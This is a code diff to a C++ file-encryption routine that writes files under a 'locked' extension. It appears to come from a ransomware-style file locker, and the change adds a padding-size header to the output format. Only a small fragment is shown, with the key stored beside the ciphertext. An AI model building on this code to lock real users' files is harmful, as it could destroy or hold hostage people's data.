@@ -69,9 +69,13 @@ void initPlainText(string path, PBYTE *buffer, size_t buffSize)
 	plaintextFile.close();
 }
 
-void writeToFile(string path, PBYTE cipherText, DWORD cipherLen, PBYTE iv, PBYTE key)
+void writeToFile(string path, PBYTE cipherText, DWORD cipherLen, PBYTE iv, PBYTE key, size_t plainTextSize)
 {
+	unsigned short paddingSize = IV_LEN - (plainTextSize % IV_LEN);
+	char paddingSizeCStr[IV_DIGITS_NUM + 1] = { 0 }; //TODO 2 is the number of digits in IV_LEN, might wanna change that programatically
+	snprintf(paddingSizeCStr, IV_DIGITS_NUM + 1, "%02d", paddingSize);
 	std::ofstream ofile((path + LOCKED_EXTENSION).c_str(), std::ios::binary);
+	ofile.write(paddingSizeCStr, IV_DIGITS_NUM);
 	ofile.write((char*)iv, IV_LEN);
 	ofile.write((char*)key, KEY_LEN);
 	ofile.write((char*)cipherText, cipherLen);
@@ -151,7 +155,7 @@ void encrypt(string path)
 #ifdef DEBUG
 	std::cout << "Ciphertext:\t" << cipherText << std::endl;
 #endif
-	writeToFile(path, cipherText, cipherSize, iv, key);
+	writeToFile(path, cipherText, cipherSize, iv, key, plainTextLen);
 	
 	//TODO CLEANUP!!!!!
 	delete plainText;
